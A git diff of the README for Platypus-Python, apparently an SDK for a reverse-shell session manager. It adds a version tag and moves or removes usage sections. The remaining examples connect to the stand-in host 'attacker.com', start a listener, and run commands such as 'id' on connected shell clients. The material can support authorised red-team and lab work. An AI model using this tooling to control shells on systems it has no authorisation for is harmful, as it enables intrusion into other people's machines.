@@ -1,6 +1,6 @@
 # Platypus-Python
 
-Python SDK for reverse shell sessions manager [Platypus](https://github.com/WangYihang/Platypus)
+Python SDK for reverse shell sessions manager [Platypus v1.3.1](https://github.com/WangYihang/Platypus)
 
 ## Install
 
@@ -23,6 +23,13 @@ p = pp.Platypus("attacker.com", 7331)
 server = p.create_server("0.0.0.0", 13339)
 ```
 
+### Stop a reverse shell server
+
+```python
+server = servers[0]
+server.delete()
+```
+
 ### Get all available listening servers
 
 ```python
@@ -31,12 +38,6 @@ for server in servers():
     print(server)
 ```
 
-### Stop a reverse shell server
-
-```python
-server = servers[0]
-server.delete()
-```
 
 ### Get all online Clients of a server
 
@@ -52,17 +53,4 @@ for client in clients:
 ```python
 client = clients[0]
 client.system("id")
-```
-
-### Execute a command on all clients of a server
-
-```python
-server = servers[0]
-server.system("id")
-```
-
-### Execute a command on all clients
-
-```python
-p.system("id")
 ```
